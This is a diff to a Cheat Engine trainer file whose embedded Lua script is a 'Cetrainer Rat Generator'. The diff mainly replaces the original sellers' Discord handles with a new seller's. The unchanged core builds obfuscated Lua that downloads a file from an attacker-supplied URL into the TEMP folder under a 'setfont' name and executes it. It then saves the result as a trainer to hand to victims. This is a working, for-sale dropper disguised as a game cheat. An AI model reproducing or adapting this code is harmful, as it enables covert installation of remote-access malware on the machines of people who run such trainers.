@@ -7,18 +7,18 @@
   <CheatEntries/>
   <UserdefinedSymbols/>
   <LuaScript>--deleted hwid protection on system that my old project no protection etc
---if u want buy projects etc pm me discord : SrMotion#1337 or xeome#1337
+--if u want buy projects etc pm me discord : ArDa#8580
 --official luacr team
---If You Want Buy LuaCR v7.1 Pm SrMotion#1337 or xeome#1337
---by SrMotion#1337 and xeome#1337
-function discord() local asd = "https://discord.gg/7YfDgSV" shellExecute(asd) end
+--If You Want Buy LuaCR v7.1 Pm ArDa#8580
+--by ArDa#8580
+function discord() local asd = "https://discord.gg/b54vDzy" shellExecute(asd) end
 function ceratsuccess()
 
 function fadeinShow(form) form.DoubleBuffered = true form.AlphaBlend = true form.Visible = true form.AlphaBlendValue = 0 local timer = createTimer(form,false) timer.Interval = 1 timer.OnTimer = function (t) form.AlphaBlendValue = form.AlphaBlendValue + 2 if form.AlphaBlendValue&gt;=250 then form.AlphaBlendValue = 255 form.AlphaBlend = false t.Enabled = false end end timer.Enabled = true end fadeinShow(UDF1)
 function CELabel6Click(sender) closeCE() end
 function closeClick(sender) os.exit() end
-function UDF1_CELabel3Click(sender) MessageDialog("Cetrainer Rat Generator Made By SrMotion#1337 and xeome#1337") closeCE() end
-function purchaseClick(sender) showMessage"Discord : SrMotion#1337 or xeome#1337" end
+function UDF1_CELabel3Click(sender) MessageDialog("Cetrainer Rat Generator") closeCE() end
+function purchaseClick(sender) showMessage"Discord : ArDa#8580" end
 function tobyte(str)
 return str:gsub(".",function(c)
 return "\\"..c:byte()
@@ -35,8 +35,8 @@ UDF2.CEEdit1.text = ""
 function CEPanel2Click(sender)
 getLuaEngine().mOutput.clear()
 if string.find(UDF1.CEMemo1.text,"http") then
-print("--LuaCR by SrMotion#1337 - xeome#1337")
-local ceratfunctionisthat = "--by SrMotion#1337 and xeome#1337\nfunction LuaCR_ilIilI(iElIinlTI5391ilI)local ilInErTiGElilI = (5*3-2/8+9*2/9+8*3) end function LuaCR_ilIilI(nErtIgElwAshErE)local ilInErTiGElilI = (5*3-2/8+9*2/9+8*3) end local ilInErTiGElilI = (5*3-2/8+9*2/9+8*3) local url = '"..UDF1.CEMemo1.text.."'local a= getInternet()local test = a.getURL(url)local location = os.getenv('TEMP')local file = io.open(location..'\\\\setfont"..UDF1.CEMemo2.text.."', 'wb')file:write(test)file:close()shellExecute(location..'\\\\setfont"..UDF1.CEMemo2.text.."')"
+print("--ArDa#8580")
+local ceratfunctionisthat = "--by ArDa#8580\nfunction LuaCR_ilIilI(iElIinlTI5391ilI)local ilInErTiGElilI = (5*3-2/8+9*2/9+8*3) end function LuaCR_ilIilI(nErtIgElwAshErE)local ilInErTiGElilI = (5*3-2/8+9*2/9+8*3) end local ilInErTiGElilI = (5*3-2/8+9*2/9+8*3) local url = '"..UDF1.CEMemo1.text.."'local a= getInternet()local test = a.getURL(url)local location = os.getenv('TEMP')local file = io.open(location..'\\\\setfont"..UDF1.CEMemo2.text.."', 'wb')file:write(test)file:close()shellExecute(location..'\\\\setfont"..UDF1.CEMemo2.text.."')"
 
 local save = createSaveDialog(self)
 save.InitalDir = os.getenv('%USERPROFILE%')
